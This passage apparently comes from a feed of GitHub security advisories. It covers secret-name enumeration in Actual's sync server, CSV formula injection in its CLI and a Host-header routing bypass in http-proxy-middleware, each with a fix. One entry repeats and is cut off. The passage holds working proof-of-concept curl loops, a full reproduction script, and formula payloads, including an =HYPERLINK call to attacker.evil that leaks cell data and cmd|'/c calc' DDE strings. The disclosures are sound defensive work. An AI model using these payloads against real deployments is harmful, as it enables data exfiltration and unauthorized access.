    body: new URLSearchParams({ grant_type: "client_credentials" }),
    redirect: "manual",
  }
  // ...
}
</code></pre>
<p>Alternatively, replace the <code>fetch</code> call with <code>fetchWithBlacklist</code>, which handles both checks and re-validates redirect targets.</p>
<hr>
<p><em>Found by <a href="https://aisafe.io">aisafe.io</a></em></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Budibase/budibase/security/advisories/GHSA-4q6h-8p4v-67vq">https://github.com/Budibase/budibase/security/advisories/GHSA-4q6h-8p4v-67vq</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-48153">https://nvd.nist.gov/vuln/detail/CVE-2026-48153</a></li>
<li><a href="https://github.com/advisories/GHSA-4q6h-8p4v-67vq">https://github.com/advisories/GHSA-4q6h-8p4v-67vq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4q6h-8p4v-67vq</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-22T22:45:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@actual-app/sync-server] @actual-app/sync-server's missing authorization on GET /secret/:name allows non-admin OpenID users to enumerate admin-configured bank-sync secrets]]></title>
        <id>https://github.com/advisories/GHSA-3f62-qv96-4p78</id>
        <link href="https://github.com/advisories/GHSA-3f62-qv96-4p78"/>
        <updated>2026-06-22T21:42:36.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>In <code>@actual-app/sync-server</code>, the <code>GET /secret/:name</code> endpoint (<code>app-secrets.js:53</code>) checks only that the caller has a valid session — it does not verify the caller is an admin. The sibling <code>POST /secret/</code> handler does enforce an admin check in OpenID mode, exposing an authorization asymmetry. Any authenticated non-admin (BASIC) user in OpenID multi-user deployments can probe the secrets store and learn which admin-managed bank-sync integrations have been configured (existence, not values). This includes integration credentials that are not otherwise observable to non-admins, such as <code>simplefin_accessKey</code>, <code>pluggyai_clientSecret</code>, <code>pluggyai_itemIds</code>, and the <code>gocardless_*</code> secrets.</p>
<h2 id="details">Details</h2>
<p><code>packages/sync-server/src/app-secrets.js</code> mounts <code>validateSessionMiddleware</code> at the router level (line 15), so all handlers inherit only "must be authenticated." The POST handler then explicitly upgrades to an admin check when the active auth method is <code>openid</code>:</p>
<pre><code class="language-js">// app-secrets.js:17-46
app.post('/', async (req, res) =&gt; {
  // ... look up active auth method ...
  if (method === 'openid') {
    const canSaveSecrets = isAdmin(res.locals.user_id);
    if (!canSaveSecrets) {
      res.status(403).send({
        status: 'error',
        reason: 'not-admin',
        details: 'You have to be admin to set secrets',
      });
      return;
    }
  }
  secretsService.set(name, value);
  // ...
});
</code></pre>
<p>The sibling GET handler skips both the method check and the admin check entirely:</p>
<pre><code class="language-js">// app-secrets.js:53-61
app.get('/:name', async (req, res) =&gt; {
  const name = req.params.name;
  const keyExists = secretsService.exists(name);
  if (keyExists) {
    res.sendStatus(204);
  } else {
    res.status(404).send('key not found');
  }
});
</code></pre>
<p>The intent — visible from the POST handler's "You have to be admin to set secrets" — is that this store holds admin-managed credentials. The valid secret names enumerated in <code>services/secrets-service.js</code> (<code>SecretName</code>) are: <code>gocardless_secretId</code>, <code>gocardless_secretKey</code>, <code>simplefin_token</code>, <code>simplefin_accessKey</code>, <code>pluggyai_clientId</code>, <code>pluggyai_clientSecret</code>, <code>pluggyai_itemIds</code>.</p>
<p>In OpenID mode, BASIC users obtain valid sessions through <code>packages/sync-server/src/accounts/openid.ts:264-274</code> — either auto-created (<code>userCreationMode=login</code>) or pre-provisioned by the admin (<code>userCreationMode=manual</code>). With that BASIC session token they can hit <code>GET /secret/:name</code> and distinguish 204 (configured) from 404 (missing), enumerating each admin-managed secret name. Some signals (<code>simplefin_token</code> existence, <code>pluggyai_clientId</code> existence) are already coarsely observable via the unauthenticated bank-sync status endpoints (<code>app-simplefin.js:18</code>, <code>app-pluggyai.js:18</code>); the rest (<code>simplefin_accessKey</code>, <code>pluggyai_clientSecret</code>, <code>pluggyai_itemIds</code>, both <code>gocardless_*</code> secrets) are not otherwise probeable.</p>
<p>This is structurally identical to the previously reported missing-admin-check on <code>GET /admin/users/</code> (<code>app-admin.js:28</code>): a POST sibling enforces admin authorization while the GET sibling omits it.</p>
<h2 id="poc">PoC</h2>
<p>Pre-requisites:</p>
<ul>
<li>Server is configured for OpenID multi-user mode (<code>ACTUAL_OPENID_ENFORCE=true</code> or auth method is <code>openid</code>).</li>
<li>An admin has configured one or more bank-sync integrations.</li>
<li>The attacker is any authenticated BASIC user (auto-created via <code>userCreationMode=login</code>, or admin-provisioned in the default <code>manual</code> mode).</li>
</ul>
<p>Step 1 — capture a BASIC user's session token in <code>$TOKEN</code> (standard OpenID login flow, no admin role required).</p>
<p>Step 2 — probe each admin-managed secret name:</p>
<pre><code class="language-bash">for name in gocardless_secretId gocardless_secretKey \
            simplefin_token simplefin_accessKey \
            pluggyai_clientId pluggyai_clientSecret pluggyai_itemIds; do
  status=$(curl -s -o /dev/null -w '%{http_code}' \
           -H "X-ACTUAL-TOKEN: $TOKEN" \
           https://actual.example.com/secret/$name)
  echo "$name -&gt; $status"   # 204 = configured, 404 = missing
done
</code></pre>
<p>Step 3 — confirm the asymmetry by attempting to write a secret (correctly rejected for non-admins):</p>
<pre><code class="language-bash">curl -s -H "X-ACTUAL-TOKEN: $TOKEN" \
     -H 'Content-Type: application/json' \
     -d '{"name":"pluggyai_itemIds","value":"x"}' \
     https://actual.example.com/secret/
# {"status":"error","reason":"not-admin","details":"You have to be admin to set secrets"}
</code></pre>
<p>The POST returns 403 <code>not-admin</code>; the GET returns 204/404 unauthenticated-against-role.</p>
<h2 id="impact">Impact</h2>
<ul>
<li>A non-admin authenticated user in OpenID multi-user mode can enumerate which admin-managed bank-sync integrations the deployment uses.</li>
<li>This reveals whether GoCardless, SimpleFIN, and/or Pluggy AI are configured, and which auxiliary credentials the admin has set (e.g. <code>simplefin_accessKey</code>, <code>pluggyai_clientSecret</code>, <code>pluggyai_itemIds</code>) — none of which are otherwise observable to non-admins.</li>
<li>The disclosure is existence-only; secret values are not returned. Impact is limited to recon useful for targeted follow-on attacks (e.g. credential phishing, picking which integration to attack on a separate vulnerability).</li>
<li>No integrity or availability impact.</li>
</ul>
<h2 id="recommended-fix">Recommended Fix</h2>
<p>Mirror the POST handler's admin gate on the GET handler. Minimal patch in <code>packages/sync-server/src/app-secrets.js</code>:</p>
<pre><code class="language-js">app.get('/:name', async (req, res) =&gt; {
  let method;
  try {
    const result = getAccountDb().first(
      'SELECT method FROM auth WHERE active = 1',
    );
    method = result?.method;
  } catch (error) {
    console.error('Failed to fetch auth method:', error);
    return res.status(500).send({
      status: 'error',
      reason: 'database-error',
      details: 'Failed to validate authentication method',
    });
  }

  if (method === 'openid' &amp;&amp; !isAdmin(res.locals.user_id)) {
    return res.status(403).send({
      status: 'error',
      reason: 'not-admin',
      details: 'You have to be admin to read secret status',
    });
  }

  const name = req.params.name;
  const keyExists = secretsService.exists(name);
  if (keyExists) {
    res.sendStatus(204);
  } else {
    res.status(404).send('key not found');
  }
});
</code></pre>
<p>Consider factoring the method-lookup + admin-check into a shared helper used by both POST and GET to prevent the same asymmetry from recurring. Also consider restricting <code>:name</code> to the <code>SecretName</code> enum so unrelated probing is rejected up front.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/actualbudget/actual/security/advisories/GHSA-3f62-qv96-4p78">https://github.com/actualbudget/actual/security/advisories/GHSA-3f62-qv96-4p78</a></li>
<li><a href="https://github.com/advisories/GHSA-3f62-qv96-4p78">https://github.com/advisories/GHSA-3f62-qv96-4p78</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3f62-qv96-4p78</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-22T21:42:34.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@actual-app/cli] @actual-app/cli `--format csv` Output Vulnerable to CSV Formula Injection via Custom `escapeCsv` Helper]]></title>
        <id>https://github.com/advisories/GHSA-7gh7-258j-4mpq</id>
        <link href="https://github.com/advisories/GHSA-7gh7-258j-4mpq"/>
        <updated>2026-06-22T21:42:17.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><code>@actual-app/cli</code> ships a hand-rolled CSV serializer in <code>packages/cli/src/output.ts</code> (used whenever the global <code>--format csv</code> option is passed) whose <code>escapeCsv</code> helper only handles RFC 4180 delimiter/quote/newline escaping. It does <strong>not</strong> neutralize the standard CSV formula-injection prefixes (<code>=</code>, <code>+</code>, <code>-</code>, <code>@</code>, <code>\t</code>, <code>\r</code>). Any CLI command that streams an object array containing user-controlled strings — <code>transactions list</code>, <code>accounts list</code>, <code>payees list</code>, <code>categories list</code>, <code>tags list</code>, <code>category-groups list</code>, <code>rules list</code>, <code>schedules list</code>, <code>query</code> — will emit cells that auto-evaluate when the resulting CSV is opened in Excel, LibreOffice Calc, or Google Sheets, enabling data exfiltration (<code>=HYPERLINK(...)</code>, <code>=WEBSERVICE(...)</code>) and arbitrary formula execution.</p>
<p>This is a <strong>distinct variant</strong> of the formula-injection surface in <code>packages/loot-core/src/server/transactions/export/export-to-csv.ts</code> (which uses <code>csv-stringify</code> and would need a separate <code>cast</code> option fix) — they are different files, different packages, and different serializers. Fixing one does not fix the other.</p>
<h2 id="details">Details</h2>
<h3 id="vulnerable-code">Vulnerable code</h3>
<p><code>packages/cli/src/output.ts:98-103</code>:</p>
<pre><code class="language-ts">function escapeCsv(value: string): string {
  if (value.includes(',') || value.includes('"') || value.includes('\n')) {
    return '"' + value.replace(/"/g, '""') + '"';
  }
  return value;
}
</code></pre>
<p>The helper performs only delimiter/quote/newline neutralization, which is sufficient for RFC 4180 <em>parsing</em> but irrelevant to spreadsheet <em>formula evaluation</em>. CSV double-quoting is invisible to Excel/Calc/Sheets — the unquoted cell value <code>=HYPERLINK("http://attacker/?d="&amp;B2,"Click")</code> is still parsed as a formula by the spreadsheet, even when wrapped as <code>"=HYPERLINK(""http://attacker/?d=""&amp;B2,""Click"")"</code> on disk.</p>
<h3 id="data-flow-to-the-sink">Data flow to the sink</h3>
<ol>
<li>The global <code>--format</code> option is registered at <code>packages/cli/src/index.ts:53-57</code> with <code>choices(['json','table','csv'])</code> and applies to every subcommand.</li>
<li>List/query subcommands invoke <code>printOutput(data, format)</code> (<code>output.ts:105-107</code>), which routes <code>format === 'csv'</code> to <code>formatCsv</code> (<code>output.ts:71-96</code>).</li>
<li>For each row, every column is run through <code>formatCellValue</code> (<code>output.ts:21-26</code>):<pre><code class="language-ts">function formatCellValue(key: string, value: unknown): string {
  if (isAmountValue(key, value)) {
    return (value / 100).toFixed(2);
  }
  return String(value ?? '');
}
</code></pre>
Only the fixed <code>AMOUNT_FIELDS</code> set (<code>amount</code>, <code>balance</code>, <code>budgeted</code>, etc.) gets numeric coercion. User-controlled string fields — <code>payee.name</code>, <code>account.name</code>, <code>category.name</code>, <code>notes</code>, tag names, rule descriptions, schedule names — are passed verbatim to <code>escapeCsv</code>.</li>
<li><code>escapeCsv</code> returns the value unmodified unless it contains <code>,</code>, <code>"</code>, or <code>\n</code>. A payload such as <code>=1+1</code>, <code>@SUM(...)</code>, <code>+1+cmd|'/c calc'!A0</code>, or <code>-2+3+cmd|'/c calc'!A0</code> therefore lands in the output as a leading-character formula.</li>
</ol>
<h3 id="exploitability-conditions">Exploitability conditions</h3>
<ul>
<li>The CLI is installed and used by the victim (<code>@actual-app/cli</code> is published with <code>"bin": { "actual": "./dist/cli.js", "actual-cli": "./dist/cli.js" }</code>).</li>
<li>The attacker can persist a malicious string in any user-controlled field of the budget. Realistic vectors:<ul>
<li>Co-user / co-collaborator of a synced budget (multi-device, or attacker-controlled sync server).</li>
<li>Sending the victim a crafted OFX/QIF/CSV import file.</li>
<li>API write access (e.g., over a compromised sync session).</li>
</ul>
</li>
<li>The victim runs <code>actual &lt;list-cmd&gt; --format csv &gt; out.csv</code> and opens <code>out.csv</code> in a spreadsheet program. CSV files generated locally by the CLI are not gated by Office Protected View / Mark-of-the-Web, so formulas evaluate immediately.</li>
</ul>
<p>There are <strong>no mitigations</strong> in the code path: no allowlist, no sanitizer, no <code>cast</code> option, no warning, and the CLI is shipped to end users via npm.</p>
<h2 id="poc">PoC</h2>
<p>Setup (one-time — choose any user-controlled field; payee shown):</p>
<pre><code class="language-bash"># Inject via the CLI's own write path (or via OFX/QIF/CSV import, or shared sync):
actual transactions add \
  --account "$ACCOUNT_ID" \
  --data '[{"payee_name":"=HYPERLINK(\"http://attacker.evil/leak?d=\"&amp;B2,\"Bank refund\")","date":"2026-01-01","amount":10000}]'
</code></pre>
<p>Trigger (victim runs):</p>
<pre><code class="language-bash">actual transactions list --account "$ACCOUNT_ID" --start 2026-01-01 --end 2026-12-31 --format csv &gt; out.csv
cat out.csv
</code></pre>
<p>Observed output (abridged; quoting is RFC 4180-correct but the formula prefix is preserved):</p>
<pre><code>id,date,amount,payee,notes,category,account,cleared,reconciled
abc...,2026-01-01,100.00,"=HYPERLINK(""http://attacker.evil/leak?d=""&amp;B2,""Bank refund"")",,,Checking,false,false
</code></pre>
<p>Open <code>out.csv</code> in Excel / LibreOffice Calc / Google Sheets → the <code>payee</code> cell renders as a clickable hyperlink that, when clicked (or auto-fetched in some configurations), exfiltrates neighboring cell content (<code>B2</code> = the date, but trivially adjustable to any cell) to the attacker.</p>
<p>Minimal-payload variants that bypass <code>escapeCsv</code> entirely (no <code>,</code>, <code>"</code>, or <code>\n</code> → no quoting at all):</p>
<ul>
<li>Payee name <code>=1+1</code> → cell shows <code>2</code>.</li>
<li>Payee name <code>@SUM(1+1)</code> → cell shows <code>2</code>.</li>
<li>Payee name <code>+1+1</code> → cell shows <code>2</code>.</li>
<li>Payee name <code>-2+3</code> → cell shows <code>1</code>.</li>
</ul>
<p>The same applies to other list commands sharing the global <code>--format</code> option:</p>
<pre><code class="language-bash">actual accounts list   --format csv      # account.name
actual payees   list   --format csv      # payee.name
actual categories list --format csv      # category.name
actual tags list       --format csv
actual category-groups list --format csv
actual rules list      --format csv
actual schedules list  --format csv
actual query "..."     --format csv
</code></pre>
<p>Verified by reading <code>escapeCsv</code> (<code>packages/cli/src/output.ts:98-103</code>): the only escape triggers are <code>,</code>, <code>"</code>, <code>\n</code>, and even when triggered the leading character is preserved.</p>
<h2 id="impact">Impact</h2>
<ul>
<li><strong>Data exfiltration</strong> in the victim's spreadsheet context via <code>=HYPERLINK(...)</code>, <code>=WEBSERVICE(...)</code>, <code>=IMPORTXML(...)</code> (Sheets), <code>=IMPORTDATA(...)</code> (Sheets) — typically one click for HYPERLINK, fully automatic for WEBSERVICE/IMPORT* on confirmation. Victim's financial data (account names, balances, transactions in adjacent cells) is the natural exfil target.</li>
<li><strong>Arbitrary formula execution</strong> in the victim's spreadsheet context, including legacy DDE-style payloads on outdated Excel installations (potential RCE).</li>
<li><strong>Trust-boundary crossing</strong>: financial data the victim assumes is "exported" becomes attacker-controlled active content. The CLI is the victim's own trusted tool; users do not expect <code>actual transactions list --format csv</code> to produce a file that runs code.</li>
</ul>
<p>Blast radius is bounded by the requirement that the attacker plant a string in a user-controlled field and the victim opens the CSV in a spreadsheet — but both are realistic for a personal-finance app whose primary export workflow is "open in Excel".</p>
<h2 id="recommended-fix">Recommended Fix</h2>
<p>Neutralize formula-trigger prefixes in <code>escapeCsv</code> <em>before</em> the existing RFC 4180 quoting. Example:</p>
<pre><code class="language-ts">// packages/cli/src/output.ts
const FORMULA_TRIGGERS = /^[=+\-@\t\r]/;

function escapeCsv(value: string): string {
  // Neutralize spreadsheet formula prefixes (CWE-1236).
  if (FORMULA_TRIGGERS.test(value)) {
    value = "'" + value;
  }
  if (value.includes(',') || value.includes('"') || value.includes('\n')) {
    return '"' + value.replace(/"/g, '""') + '"';
  }
  return value;
}
</code></pre>
<p>The leading single-quote is the OWASP-recommended neutralizer: it is stripped by Excel/Calc on display but prevents formula evaluation. Apply the same fix in <code>packages/loot-core/src/server/transactions/export/export-to-csv.ts</code> by passing a <code>cast</code> option to <code>csv-stringify</code> that prepends <code>'</code> to any string starting with a formula trigger — the two sites are independent and both must be patched.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/actualbudget/actual/security/advisories/GHSA-7gh7-258j-4mpq">https://github.com/actualbudget/actual/security/advisories/GHSA-7gh7-258j-4mpq</a></li>
<li><a href="https://github.com/advisories/GHSA-7gh7-258j-4mpq">https://github.com/advisories/GHSA-7gh7-258j-4mpq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7gh7-258j-4mpq</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-22T21:42:15.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[http-proxy-middleware] http-proxy-middleware `router` host+path substring matching allows Host-header-driven backend routing bypass]]></title>
        <id>https://github.com/advisories/GHSA-64mm-vxmg-q3vj</id>
        <link href="https://github.com/advisories/GHSA-64mm-vxmg-q3vj"/>
        <updated>2026-06-23T10:15:39.000Z</updated>
        <content type="html"><![CDATA[<h1 id="summary">Summary</h1>
<p><code>http-proxy-middleware</code> documents <code>router</code> proxy-table entries as host, path, or host+path selectors, but the host+path implementation uses unanchored substring matching on attacker-controlled request metadata. As a result, a crafted <code>Host</code> header that is only a superstring match for a configured host+path key can still route a request to an unintended backend.</p>
<h1 id="details">Details</h1>
<p>Tested code state:</p>
<ul>
<li>validated on tag <code>v4.0.0-beta.5</code></li>
<li>corresponding commit: <code>339f09ede860197807d4fd99ed9020fa5d0bd358</code></li>
</ul>
<p>Relevant code locations:</p>
<ul>
<li><code>src/router.ts</code></li>
<li><code>src/http-proxy-middleware.ts</code></li>
</ul>
<p>Affected public API:</p>
<ul>
<li><code>createProxyMiddleware({ router: { 'host/path': 'http://target' } })</code></li>
</ul>
<p>Code explanation:</p>
<p>When a proxy-table router key contains <code>/</code>, <code>getTargetFromProxyTable()</code> concatenates attacker-controlled <code>req.headers.host</code> and <code>req.url</code> into a single <code>hostAndPath</code> string, then accepts the route if:</p>
<pre><code class="language-ts">hostAndPath.indexOf(key) &gt; -1
</code></pre>
<p>That is a substring test, not an exact host match plus intended path match. In the validated PoC, the configured router key is:</p>
<pre><code class="language-txt">localhost:3000/api
</code></pre>
<p>but the attacker-controlled host is:</p>
<pre><code class="language-txt">evillocalhost:3000
</code></pre>
<p>and the request path is:</p>
<pre><code class="language-txt">/api
</code></pre>
<p>The concatenated attacker-controlled string:</p>
<pre><code class="language-txt">evillocalhost:3000/api
</code></pre>
<p>still contains the configured router key as a substring, so the middleware selects the alternate backend even though the host is not equal to the configured host.</p>
<p>Exploit path:</p>
<ol>
<li>the application enables the documented proxy-table <code>router</code> feature with at least one host+path rule</li>
<li>an external attacker sends an ordinary HTTP request with a crafted <code>Host</code> header</li>
<li><code>HttpProxyMiddleware.prepareProxyRequest()</code> applies router selection before proxying</li>
<li><code>getTargetFromProxyTable()</code> accepts the crafted <code>Host + path</code> string through substring matching</li>
<li>the request is proxied to the wrong backend</li>
</ol>
<h2 id="poc">PoC</h2>
<p>Create these files in the same working directory and run:</p>
<pre><code class="language-bash">bash ./run.sh
</code></pre>
<h3 id="file-runsh">File: <code>run.sh</code></h3>
<pre><code class="language-bash">#!/usr/bin/env bash
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" &amp;&amp; pwd)"
REPO_URL="https://github.com/chimurai/http-proxy-middleware.git"
REPO_REF="v4.0.0-beta.5"
WORKDIR="$(mktemp -d "${SCRIPT_DIR}/.tmp-repro.XXXXXX")"
TARGET_REPO_DIR="${WORKDIR}/repo"
REPRO_DIR="${WORKDIR}/reproduction"
IMAGE_TAG="http-proxy-middleware-router-bypass-poc"

cleanup() {
  rm -rf "${WORKDIR}"
}
trap cleanup EXIT

echo "[a3] cloning target repository"
git clone --quiet "${REPO_URL}" "${TARGET_REPO_DIR}"
git -C "${TARGET_REPO_DIR}" checkout --quiet "${REPO_REF}"

mkdir -p "${REPRO_DIR}"
cp "${SCRIPT_DIR}/Dockerfile" "${WORKDIR}/Dockerfile"
cp "${SCRIPT_DIR}/verify.mjs" "${REPRO_DIR}/verify.mjs"

echo "[a3] building reproduction image"
docker build -f "${WORKDIR}/Dockerfile" -t "${IMAGE_TAG}" "${WORKDIR}"

echo "[a3] running verification"
docker run --rm "${IMAGE_TAG}" node /work/reproduction/verify.mjs
</code></pre>
<h3 id="file-dockerfile">File: <code>Dockerfile</code></h3>
<pre><code class="language-Dockerfile">FROM node:22-bullseye

WORKDIR /work

COPY repo/package.json repo/yarn.lock /work/repo/

RUN corepack enable \
  &amp;&amp; cd /work/repo \
  &amp;&amp; yarn install --frozen-lockfile

COPY repo /work/repo
RUN cd /work/repo &amp;&amp; yarn build

COPY reproduction /work/reproduction
</code></pre>
<h3 id="file-verifymjs">File: <code>verify.mjs</code></h3>
<pre><code class="language-js">import http from 'node:http';
import fs from 'node:fs';
import assert from 'node:assert/strict';

import { createProxyMiddleware } from '/work/repo/dist/index.js';

const ROUTER_KEY = 'localhost:3000/api';
const CRAFTED_HOST = 'evillocalhost:3000';

function listen(server, port) {
  return new Promise((resolve) =&gt; {
    server.listen(port, '127.0.0.1', () =&gt; resolve());
  });
}

function close(server) {
  return new Promise((resolve, reject) =&gt; {
    server.close((err) =&gt; {
      if (err) {
        reject(err);
        return;
      }
      resolve();
    });
  });
}

function request(path, host) {
  return new Promise((resolve, reject) =&gt; {
    const req = http.request(
      {
        host: '127.0.0.1',
        port: 3000,
        path,
        method: 'GET',
        headers: {
          Host: host,
        },
      },
      (res) =&gt; {
        let data = '';
        res.setEncoding('utf8');
        res.on('data', (chunk) =&gt; {
          data += chunk;
        });
        res.on('end', () =&gt; {
          resolve({ statusCode: res.statusCode, body: data });
        });
      },
    );
    req.on('error', reject);
    req.end();
  });
}

const defaultBackend = http.createServer((req, res) =&gt; {
  res.end('DEFAULT');
});

const secretBackend = http.createServer((req, res) =&gt; {
  res.end('SECRET');
});

const proxyMiddleware = createProxyMiddleware({
  target: 'http://127.0.0.1:3101',
  router: {
    [ROUTER_KEY]: 'http://127.0.0.1:3102',
  },
});

const proxyServer = http.createServer((req, res) =&gt; {
  proxyMiddleware(req, res, () =&gt; {
    res.statusCode = 404;
    res.end('NO_PROXY');
  });
});

try {
  assert.ok(fs.existsSync('/work/repo/dist/index.js'));
  assert.ok(fs.existsSync('/work/reproduction/verify.mjs'));

  await listen(defaultBackend, 3101);
  await listen(secretBackend, 3102);
  await listen(proxyServer, 3000);
  console.log('STEP start-services ok');

  const baseline = await request('/api', 'safe.example:3000');
  assert.equal(baseline.statusCode, 200);
  assert.equal(baseline.body, 'DEFAULT');
  console.log(`STEP baseline-route body=${baseline.body}`);

  const crafted = await request('/api', CRAFTED_HOST);
  assert.equal(crafted.statusCode, 200);
  assert.equal(crafted.body, 'SECRET');
  assert.notEqual(CRAFTED_HOST, ROUTER_KEY.split('/')[0]);
  console.log(`STEP crafted-route body=${crafted.body}`);

  console.log('RESULT reproduced host_header_injection router substring match bypass');
} finally {
  await Promise.allSettled([close(proxyServer), close(defaultBackend), close(secretBackend)]);
}
</code></pre>
<p>This PoC starts:</p>
<ul>
<li>one default backend returning <code>DEFAULT</code></li>
<li>one alternate backend returning <code>SECRET</code></li>
<li>one proxy using:</li>
</ul>
<pre><code class="language-js">createProxyMiddleware({
  target: 'http://127.0.0.1:3101',
  router: {
    [ROUTER_KEY]: 'http://127.0.0.1:3102',
  },
});
</code></pre>
<p>It then sends:</p>
<ol>
<li>a baseline request to <code>/api</code> with <code>Host: safe.example:3000</code></li>
<li>a crafted request to <code>/api</code> with <code>Host: evillocalhost:3000</code></li>
</ol>
<p>Observed result from the validated PoC:</p>
<ul>
<li>baseline request: <code>STEP baseline-route body=DEFAULT</code></li>
<li>crafted request: <code>STEP crafted-route body=SECRET</code></li>
<li>success marker: <code>RESULT reproduced host_header_injection router substring match bypass</code></li>
</ul>
<p>The PoC is considered successful only if:</p>
<ol>
<li>the baseline request stays on the default backend</li>
<li>the crafted request reaches the alternate backend</li>
<li>the crafted host is not equal to the configured router host</li>
</ol>
<h1 id="impact">Impact</h1>
<p>This is a backend-selection integrity issue in a documented library feature. Applications that use host+path router-table rules for backend segmentation, tenant routing, or separation of public and more sensitive upstreams can have that routing boundary bypassed by an unauthenticated external client using an ordinary crafted <code>Host</code> header.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/chimurai/http-proxy-middleware/security/advisories/GHSA-64mm-vxmg-q3vj">https://github.com/chimurai/http-proxy-middleware/security/advisories/GHSA-64mm-vxmg-q3vj</a></li>
<li><a href="https://github.com/advisories/GHSA-64mm-vxmg-q3vj">https://github.com/advisories/GHSA-64mm-vxmg-q3vj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-64mm-vxmg-q3vj</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-18T13:06:11.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[http-proxy-middleware] http-proxy-middleware `router` host+path substring matching allows Host-header-driven backend routing bypass]]></title>
        <id>https://github.com/advisories/GHSA-64mm-vxmg-q3vj</id>
        <link href="https://github.com/advisories/GHSA-64mm-vxmg-q3vj"/>
        <updated>2026-06-23T10:15:39.000Z</updated>
        <content type="html"><![CDATA[<h1 id="summary">Summary</h1>
<p><code>http-proxy-middleware</code> documents <code>router</code> proxy-table entries as host, path, or host+path selectors, but the host+path implementation uses unanchored substring matching on attacker-controlled request metadata. As a result, a crafted <code>Host</code> header that is only a superstring match for a configured host+path key can still route a request to an unintended backend.</p>
<h1 id="details">Details</h1>
<p>Tested code state:</p>
<ul>
<li>validated on tag <code>v4.0.0-beta.5</code></li>
<li>corresponding commit: <code>339f09ede860197807d4fd99ed9020fa5d0bd358</code></li>
</ul>
<p>Relevant code locations:</p>
<ul>
<li><code>src/router.ts</code></li>
<li><code>src/http-proxy-middleware.ts</code></li>
</ul>
<p>Affected public API:</p>
<ul>
<li><code>createProxyMiddleware({ router: { 'host/path': 'http://target' } })</code></li>
</ul>
<p>Code explanation:</p>
<p>When a proxy-table router key contains <code>/</code>, <code>getTargetFromProxyTable()</code> concatenates attacker-controlled <code>req.headers.host</code> and <code>req.url</code> into a single <code>hostAndPath</code> string, then accepts the route if:</p>
<pre><code class="language-ts">hostAndPath.indexOf(key) &gt; -1
</code></pre>
<p>That is a substring test, not an exact host match plus intended path match. In the validated PoC, the configured router key is:</p>
<pre><code class="language-txt">localhost:3000/api
</code></pre>
<p>but the attacker-controlled host is:</p>
<pre><code class="language-txt">evillocalhost:3000
</code></pre>
<p>and the request path is:</p>
<pre><code class="language-txt">/api
</code></pre>
<p>The concatenated attacker-controlled string:</p>
<pre><code class="language-txt">evillocalhost:3000/api
</code></pre>
<p>still contains the configured router key as a substring, so the middleware selects the alternate backend even though the host is not equal to the configured host.</p>
<p>Exploit path:</p>
<ol>
<li>the application enables the documented proxy-table <code>router</code> feature with at least one host+path rule</li>
<li>an external attacker sends an ordinary HTTP request with a crafted <code>Host</code> header</li>
<li><code>HttpProxyMiddleware.prepareProxyRequest()</code> applies router selection before proxying</li>
<li><code>getTargetFromProxyTable()</code> accepts the crafted <code>Host + path</code> string through substring matching</li>
<li>the request is proxied to the wrong backend</li>
</ol>
<h2 id="poc">PoC</h2>
<p>Create these files in the same working directory and run:</p>
<pre><code class="language-bash">bash ./run.sh
</code></pre>
<h3 id="file-runsh">File: <code>run.sh</code></h3>
<pre><code class="language-bash">#!/usr/bin/env bash
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" &amp;&amp; pwd)"
REPO_URL="https://github.com/chimurai/http-proxy-middleware.git"
REPO_REF="v4.0.0-beta.5"
WORKDIR="$(mktemp -d "${SCRIPT_DIR}/.tmp-repro.XXXXXX")"
TARGET_REPO_DIR="${WORKDIR}/repo"
REPRO_DIR="${WORKDIR}/reproduction"
IMAGE_TAG="http-proxy-middleware-router-bypass-poc"

cleanup() {
  rm -rf "${WORKDIR}"
}
trap cleanup EXIT

echo "[a3] cloning target repository"
git clone --quiet "${REPO_URL}" "${TARGET_REPO_DIR}"
git -C "${TARGET_REPO_DIR}" checkout --quiet "${REPO_REF}"

mkdir -p "${REPRO_DIR}"
cp "${SCRIPT_DIR}/Dockerfile" "${WORKDIR}/Dockerfile"
cp "${SCRIPT_DIR}/verify.mjs" "${REPRO_DIR}/verify.mjs"

echo "[a3] building reproduction image"
docker build -f "${WORKDIR}/Dockerfile" -t "${IMAGE_TAG}" "${WORKDIR}"

echo "[a3] running verification"
docker run --rm "${IMAGE_TAG}" node /work/reproduction/verify.mjs
</code></pre>
<h3 id="file-dockerfile">File: <code>Dockerfile</code></h3>
<pre><code class="language-Dockerfile">FROM node:22-bullseye

WORKDIR /work

COPY repo/package.json repo/yarn.lock /work/repo/

RUN corepack enable \
  &amp;&amp; cd /work/repo \
  &amp;&amp; yarn install --frozen-lockfile

COPY repo /work/repo
RUN cd /work/repo &amp;&amp; yarn build

COPY reproduction /work/reproduction
</code></pre>
<h3 id="file-verifymjs">File: <code>verify.mjs</code></h3>
<pre><code class="language-js">import http from 'node:http';
import fs from 'node:fs';
import assert from 'node:assert/strict';

import { createProxyMiddleware } from '/work/repo/dist/index.js';

const ROUTER_KEY = 'localhost:3000/api';
const CRAFTED_HOST = 'evillocalhost:3000';
